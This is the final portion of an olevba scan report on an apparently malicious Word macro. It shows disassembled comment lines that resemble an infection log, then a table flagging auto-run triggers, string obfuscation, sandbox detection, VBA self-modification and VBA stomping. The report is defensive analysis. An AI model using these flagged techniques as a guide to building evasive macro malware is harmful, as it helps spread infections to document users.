' 	QuoteRem 0x0000 0x0021 " 11:26:03:  - ÷ĺňâĺđă, 9 ˙íâ 2003"
' Line #360:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #361:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #362:
' Line #363:
' 	QuoteRem 0x0000 0x0021 " 09:52:19:  - utorok, 18 III 2003"
' Line #364:
' 	QuoteRem 0x0000 0x0005 " Rep1"
' Line #365:
' 	QuoteRem 0x0000 0x0000 ""
' Line #366:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Andy                |May detect Anubis Sandbox                    |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

